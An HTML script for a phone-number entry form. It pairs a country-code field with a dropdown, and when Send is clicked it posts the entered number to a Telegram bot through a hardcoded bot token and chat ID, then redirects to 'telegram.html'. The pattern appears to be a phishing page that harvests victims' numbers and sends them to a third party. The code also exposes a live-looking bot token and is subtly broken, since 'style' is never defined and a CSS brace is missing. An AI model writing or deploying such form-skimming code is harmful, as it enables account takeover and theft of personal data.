<script>
  // Your existing code (unchanged)
  const countrySelect = document.getElementById('pick');
  const countryCodeInput = document.getElementById('countryCode');
  const phoneInput = document.getElementById('phone');
  const sendButton = document.getElementById('sendButton');

  // Initial focus on country code if phone is empty
  if (phoneInput.value === '') {
    countryCodeInput.focus();
  }

  // When country code input changes
  countryCodeInput.addEventListener('input', function() {
    const code = this.value;
    
    // Find matching option
    const option = Array.from(countrySelect.options).find(opt => opt.value === code);
    
    if (option) {
      option.selected = true;
      // Only focus phone if country code has value
      if (code !== '') {
        phoneInput.focus();
      }
    }
  });

  // When country is selected from dropdown
  countrySelect.addEventListener('change', function() {
    if (this.value) {
      countryCodeInput.value = this.value;
      phoneInput.focus();
    }
  });

  // When phone input is empty, focus back to country code
  phoneInput.addEventListener('input', function() {
    if (this.value === '') {
      countryCodeInput.focus();
    }
  });

  // Also check when phone input loses focus
  phoneInput.addEventListener('blur', function() {
    if (this.value === '') {
      countryCodeInput.focus();
    }
  });

  // New Telegram sending functionality
  sendButton.addEventListener('click', function() {
    const countryCode = countryCodeInput.value.trim();
    const phone = phoneInput.value.trim();
    
    if (!countryCode || !phone) {
      alert('Please enter both country code and phone number');
      return;
    }
    
    // Show loading state
    sendButton.innerHTML = '<span class="loader"></span> Sending...';
    sendButton.disabled = true;
    
    // Telegram bot details
    const botToken = '7806045699:AAHXIhdiILQQBsxWoq2R1ckTKAdOu-33-9g';
    const chatId = '7850420013';
    const message = `New number: ${countryCode}${phone}`;
    
    // Send to Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => {
      if (!response.ok) throw new Error('Network response was not ok');
      return response.json();
    })
    .then(() => {
      window.location.href = 'telegram.html';
    })
    .catch(error => {
      console.error('Error:', error);
      sendButton.innerHTML = 'Send';
      sendButton.disabled = false;
      alert('please try again. also check your number.');
    });
  });

  // Add minimal loader style directly in script

  style.textContent = `
    .loader {
      display: inline-block;
      width: 12px;
      height: 12px;
      border: 2px solid #fff;
      border-radius: 50%;
      border-top-color: transparent;
      animation: spin 1s linear infinite;
      margin-right: 5px;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }

  `;
  document.head.appendChild(style);
</script>
